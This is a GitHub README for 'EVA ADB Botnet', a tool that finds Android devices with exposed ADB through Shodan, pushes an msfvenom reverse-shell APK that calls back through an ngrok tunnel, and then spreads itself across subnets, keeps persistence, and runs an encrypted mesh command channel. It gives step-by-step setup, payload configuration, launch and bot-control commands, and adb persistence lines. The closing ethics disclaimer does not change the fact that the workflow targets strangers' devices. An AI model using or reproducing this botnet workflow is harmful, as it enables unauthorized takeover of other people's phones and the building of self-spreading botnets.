 # EVA ADB Botnet
 ![image0](https://github.com/user-attachments/assets/73a547b9-98e0-44f5-bb2a-2eed96b553bd)


**Purpose:** Ethical cybersecurity research, mesh-based botnet exploration, long-term persistent control of Android devices via open ADB, and encrypted peer-to-peer botnet mesh command.

---

## Getting Started (Clone + Setup)

To install EVA on any Linux system:

### 1. Clone the repository

```bash
git clone https://github.com/ekomsSavior/Eva_adb_botnet.git
cd Eva_adb_botnet
````

### 2. Install dependencies

```bash
sudo apt update && sudo apt install -y android-tools-adb python3-pip metasploit-framework
pip3 install pycryptodome requests
mkdir -p bots
```

---

## Optional ADB Install (Manual Method)

If you're having issues with the packaged ADB:

```bash
sudo mkdir -p /opt/android-platform-tools
cd /opt/android-platform-tools
sudo wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
sudo unzip platform-tools-latest-linux.zip
sudo mv platform-tools/* .
sudo rm -r platform-tools platform-tools-latest-linux.zip
```

Then add ADB to your PATH permanently:

```bash
echo 'export PATH=$PATH:/opt/android-platform-tools' >> ~/.bashrc
source ~/.bashrc
```

---

## Ngrok Setup

EVA uses ngrok to forward ADB and payload ports publicly.

### 1. Download & install ngrok

```bash
cd ~/Eva_adb_botnet
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x ngrok
```

### 2. Add your ngrok auth token

```bash
./ngrok config add-authtoken <your_token_here>
```

### 3. Start a tunnel for your payload listener

```bash
./ngrok tcp 1337
```

Copy the **forwarded ngrok domain and port** — you’ll need them in the payload config below.

---

##  One-Time Configuration (Before Launch)

### 1. Set your Shodan API key

Edit `adb_reaper.py` and replace this:

```python
SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
```

---

### 2. Configure msfvenom payload generation

Edit `metasploit_launcher.py` (which now builds the payload using `msfvenom`):

```python
LHOST = "0.tcp.ngrok.io"     # your forwarded ngrok domain
LPORT = "12345"              # your forwarded port
OUTPUT = "adb_payload.apk"   # payload filename
```

This file generates a ready-to-push APK payload.

---

### 3. Update payload path in dropper

Edit `adb_dropper.py`:

```python
ADB_PAYLOAD = "adb_payload.apk"
```

EVA will push this APK to every connected ADB device.

---

### 4. Set AES encryption key (optional but recommended)

Edit `jeangrey_crypto.py`:

```python
SECRET_KEY = b'ChangeThis16Byte!'  # Use a secure 16-byte AES key
```

---
![image1](https://github.com/user-attachments/assets/5df947d2-2683-4dde-bc4c-de37726a5c4b)

## Full Botnet Launch

```bash
python3 EVA_launcher.py
```

This will:

* Generate your payload via `msfvenom`
* Scan Shodan for exposed Android ADB targets
* Push the payload to infected devices
* Start encrypted mesh communication
* Begin peer discovery + replication
* Launch AI triggers + EVA Core

---

## View Active Bots

```bash
python3 eva_dashboard.py
```

* Shows IPs, tags, status
* Auto-refreshes every 3s

---

## Send Commands to Bots

```bash
python3 eva_core.py
```

Supported commands:

* `scan` – search nearby ADB devices
* `drop` – re-deploy payload
* `report` – show bot state
* `shutdown` – terminate a bot

---

## Autonomous AI Trigger Loop

```bash
python3 eva_ai_trigger.py
```

Bots will:

* Respond to mesh commands instantly
* Auto-scan, replicate, and report
* Operate continuously on mesh triggers

---

## Replication + Persistence

Bots will:

* Replicate to local subnet ADB devices
* Update `jeangrey_state.json` regularly
* Persist across reboot via `.bashrc`

Manual persistence install:

```bash
adb push jeangrey_persist.sh /sdcard/Download/
adb shell sh /sdcard/Download/jeangrey_persist.sh
```

---

## Bot Management

```bash
python3 state_editor.py
```

Allows you to:

* Rename bots
* Tag/untag
* View/edit JSON
* Delete infected nodes

---

## Directory Layout

```
Eva_adb_botnet/
├── EVA_launcher.py
├── metasploit_launcher.py       ← Generates msfvenom payload
├── adb_dropper.py               ← Pushes APK payload
├── adb_reaper.py                ← Shodan scraper
├── eva_core.py                  ← Sends mesh commands
├── eva_ai_trigger.py           ← Bot AI responder
├── eva_dashboard.py            ← Live bot status viewer
├── jeangrey_android.py         ← Bot implant logic
├── jeangrey_persist.sh         ← Android persistence
├── jeangrey_crypto.py
├── jeangrey_mesh.py
├── jeangrey_replication.py
├── jeangrey_tunnel.py
├── jeangrey_injector.py
├── state_editor.py
├── ngrok
└── bots/
    └── bot_<ip>/
        └── jeangrey_state.json
```

---

## ⚠️ Legal & Ethical Notice

EVA is a research framework designed for:

* Educational use
* Controlled environments
* Enviroments you have permission to test on.

**Do not deploy against unauthorized targets. Misuse may be illegal. You are responsible.**

---

## Vision

EVA is not just a botnet — she's a **mesh-aware framework**.
She replicates. She listens. She obeys.

